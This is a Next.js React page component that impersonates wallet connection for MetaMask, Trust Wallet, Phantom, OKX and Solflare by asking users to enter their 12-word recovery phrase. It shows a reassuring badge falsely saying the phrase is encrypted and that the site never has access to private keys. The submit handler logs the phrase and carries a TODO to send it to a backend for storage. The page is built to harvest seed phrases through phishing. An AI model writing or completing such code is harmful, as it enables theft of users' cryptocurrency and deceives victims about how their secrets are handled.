"use client";

import React, { useState } from "react";
import { ArrowLeft, Key, ShieldCheck, Check, AlertTriangle } from "lucide-react";
import UserHeader from "@/components/ui/user-header";
import UserSidebar from "@/components/ui/user-sidebar";
import UserNav from "@/components/ui/user-nav";
import Link from "next/link";
import { useParams } from "next/navigation";

const walletData: Record<string, { name: string; icon: string; color: string; description: string }> = {
  metamask: {
    name: "MetaMask",
    icon: "https://i.postimg.cc/fTbxp2yb/Meta-Mask.jpg",
    color: "#F6851B",
    description: "Enter your 12-word recovery phrase to securely connect your MetaMask wallet"
  },
  trustwallet: {
    name: "Trust Wallet",
    icon: "https://i.postimg.cc/DwHdqr2f/Trust-Wallet.jpg",
    color: "#3375BB",
    description: "Enter your 12-word recovery phrase to securely connect your Trust Wallet"
  },
  phantom: {
    name: "Phantom",
    icon: "https://i.postimg.cc/qRdsFp6k/phantom.jpg",
    color: "#AB9FF2",
    description: "Enter your 12-word recovery phrase to securely connect your Phantom wallet"
  },
  okx: {
    name: "OKX",
    icon: "https://i.postimg.cc/nzyh2LXz/OKX.jpg",
    color: "#1A1A1A",
    description: "Enter your 12-word recovery phrase to securely connect your OKX wallet"
  },
  solflare: {
    name: "Solflare",
    icon: "https://i.postimg.cc/T2N9dMZd/Solflare.jpg",
    color: "#00FFA3",
    description: "Enter your 12-word recovery phrase to securely connect your Solflare wallet"
  },
};

export default function WalletConnectPage() {
  const params = useParams();
  const walletId = params.id as string;
  const wallet = walletData[walletId];
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState<string[]>(Array(12).fill(""));
  const [showWarning, setShowWarning] = useState(true);

  const handleWordChange = (index: number, value: string) => {
    const newSeedPhrase = [...seedPhrase];
    newSeedPhrase[index] = value.toLowerCase().trim();
    setSeedPhrase(newSeedPhrase);
  };

  const handleSubmit = () => {
    const phrase = seedPhrase.join(" ");
    console.log("Seed phrase submitted:", phrase);
    // TODO: Send to backend for validation and storage
  };

  const isComplete = seedPhrase.every(word => word.length > 0);

  if (!wallet) {
    return (
      <div className="flex h-screen overflow-hidden bg-gray-50/50 dark:bg-[#080d17]">
        <UserSidebar sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />
        <div className="flex-1 flex flex-col overflow-hidden">
          <UserHeader setSidebarOpen={setSidebarOpen} />
          <main className="flex-1 overflow-y-auto pb-25 p-4 md:p-8">
            <div className="max-w-7xl mx-auto">
              <div className="text-center py-20">
                <AlertTriangle className="w-12 h-12 text-gray-400 mx-auto mb-4" />
                <p className="text-gray-600 dark:text-slate-400">Wallet not found</p>
                <Link href="/user-dashboard/link-wallet" className="inline-block mt-4 text-[#229ED9] hover:underline">
                  Back to wallet selection
                </Link>
              </div>
            </div>
          </main>
        </div>
        <UserNav />
      </div>
    );
  }

  return (
    <div className="flex h-screen overflow-hidden bg-gray-50/50 dark:bg-[#080d17]">
      {/* <UserSidebar sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} /> */}

      <div className="flex-1 flex flex-col overflow-hidden">
        {/* <UserHeader setSidebarOpen={setSidebarOpen} /> */}

        <main className="flex-1 overflow-y-auto p-4 md:p-8">
          <div className="max-w-4xl mx-auto space-y-8">
            {/* Back Button */}
            <Link 
              href="/user-dashboard/link-wallet"
              className="inline-flex items-center gap-2 text-sm text-gray-600 dark:text-slate-400 hover:text-gray-900 dark:hover:text-white transition-colors"
            >
              <ArrowLeft className="w-4 h-4" />
              Back to wallets
            </Link>

            {/* Wallet Header */}
            <div className="flex flex-col lg:flex-row gap-1 lg:gap-4">
              <div 
                className="w-10 h-10 lg:w-12 lg:h-12 rounded-lg lg:rounded-2xl flex items-left justify-left lg:items-center lg:justify-center overflow-hidden"
                style={{ backgroundColor: `${wallet.color}15` }}
              >
                <img src={wallet.icon} alt={wallet.name} className="w-full h-full" />
              </div>
              <div>
                <h1 className="text-xl lg:2xl font-black text-gray-900 dark:text-white uppercase tracking-tight">
                  Connect {wallet.name}
                </h1>
                <p className="text-sm text-gray-500 dark:text-slate-400 mt-1">
                  {wallet.description}
                </p>
              </div>
            </div>

            {/* Seed Phrase Input */}
            <div className="bg-white dark:bg-[#0f1623] border border-gray-200 dark:border-white/[0.06] rounded-2xl p-6 space-y-6">
              <div className="flex items-center gap-3 mb-4">
                <div className="p-2 bg-[#229ED9]/10 rounded-lg">
                  <Key className="w-5 h-5 text-[#229ED9]" />
                </div>
                <div>
                  <h3 className="font-bold text-gray-900 dark:text-white">Recovery Phrase</h3>
                  <p className="text-xs text-gray-500 dark:text-slate-500">Enter your 12-word seed phrase in order</p>
                </div>
              </div>

              <div className="grid grid-cols-3 md:grid-cols-4 gap-3">
                {Array.from({ length: 12 }, (_, i) => (
                  <div key={i} className="space-y-1">
                    <label className="block text-xs font-medium text-gray-500 dark:text-slate-500 mb-1">
                      Word {i + 1}
                    </label>
                    <input
                      type="text"
                      value={seedPhrase[i]}
                      onChange={(e) => handleWordChange(i, e.target.value)}
                      placeholder={`word ${i + 1}`}
                      className="w-full px-3 py-2.5 bg-gray-50 dark:bg-white/[0.04] border border-gray-200 dark:border-white/[0.06] rounded-lg text-sm text-gray-900 dark:text-white placeholder-gray-400 dark:placeholder-slate-500 focus:outline-none focus:border-[#229ED9] dark:focus:border-[#229ED9]/50 transition-colors"
                    />
                  </div>
                ))}
              </div>

              {/* Security Badge */}
              <div className="bg-emerald-50 dark:bg-emerald-500/10 border border-emerald-200 dark:border-emerald-500/20 rounded-xl p-3 flex items-start gap-3">
                <ShieldCheck className="w-4 h-4 text-emerald-600 dark:text-emerald-400 shrink-0 mt-0.5" />
                <p className="text-xs text-emerald-700 dark:text-emerald-500">
                  Your recovery phrase is encrypted end-to-end and stored securely. We never have access to your private keys.
                </p>
              </div>

              {/* Submit Button */}
              <button
                onClick={handleSubmit}
                disabled={!isComplete}
                style={{ backgroundColor: wallet.color }}
                className="w-full py-3.5 cursor-pointer hover:opacity-90 text-white rounded-full text-sm font-bold uppercase tracking-widest disabled:opacity-50 disabled:cursor-not-allowed transition-opacity flex items-center justify-center gap-2"
              >
                <Check className="w-4 h-4" />
                Connect Wallet
              </button>
            </div>
          </div>
        </main>
      </div>
      {/* <UserNav /> */}
    </div>
  );
}
